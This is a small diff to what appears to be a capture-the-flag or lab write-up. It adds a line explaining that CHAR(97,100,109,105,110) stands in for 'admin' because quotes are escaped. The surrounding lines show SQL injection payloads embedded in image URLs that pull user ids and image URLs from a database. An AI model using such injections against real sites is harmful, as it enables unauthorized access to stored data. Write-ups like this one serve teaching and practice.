@@ -117,6 +117,8 @@ http://'jpg',(SELECT id FROM user WHERE username = CHAR(97,100,109,105,110)))#.j
 ``` 
 Result: `34`
 
+Since quote is escaped so I using `CHAR(97,100,109,105,110)` for `'admin'`
+
 But I encounted a problem when select from image:
 ```
 http://'jpg',(SELECT url FROM image WHERE user_id = 34 LIMIT 1))#.jpg
